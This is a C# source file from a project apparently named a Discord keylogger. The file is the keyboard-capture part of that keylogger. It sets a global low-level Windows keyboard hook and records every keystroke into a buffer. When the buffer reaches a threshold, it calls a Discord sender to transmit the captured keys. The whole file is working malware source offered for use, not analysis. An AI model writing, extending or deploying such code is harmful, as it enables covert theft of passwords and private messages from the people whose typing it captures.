using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace THT_Discord_Keylogger
{
    class KeyboardHook
    {
        public static KeysConverter keysConverter = new KeysConverter();
        public static CultureInfo cultureInfo = CultureInfo.CurrentCulture;
        public static HookProc KeyboardHookGCRootedDelegate;
        public static string key_buffer = "";
        public static int key_count = 0;

        public static IntPtr keyboard_hook_process(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode < 0 ||
                !(wParam == (IntPtr)WindowsMessages.WM_SYSKEYDOWN || wParam == (IntPtr)WindowsMessages.WM_KEYDOWN))
            {
                return DLLImports.CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
            }

            Keys key = (Keys)Marshal.ReadInt32(lParam);
            string parsed_key = Utils.key_parser(keysConverter.ConvertToString(null, CultureInfo.CurrentCulture, key));

            if (!(KeyboardHook.key_buffer.Length < Settings.buffer_threshold) ||
                !((KeyboardHook.key_buffer.Length + parsed_key.Length) < Settings.buffer_threshold))
            {
                Program.discord.send();
                key_buffer = "";
                key_count = 0;
            }

            key_buffer += parsed_key;
            key_count++;

            return DLLImports.CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
        }

        public static IntPtr keyboard_hook = IntPtr.Zero;
        public static void setup_hook()
        {
            IntPtr instance = DLLImports.LoadLibrary("user32.dll");
            if (instance == IntPtr.Zero)
            {
                return;
            }

            KeyboardHookGCRootedDelegate = keyboard_hook_process;
            keyboard_hook = DLLImports.SetWindowsHookEx(HookType.WH_KEYBOARD_LL, KeyboardHookGCRootedDelegate, instance, 0);    
        }
    }
}
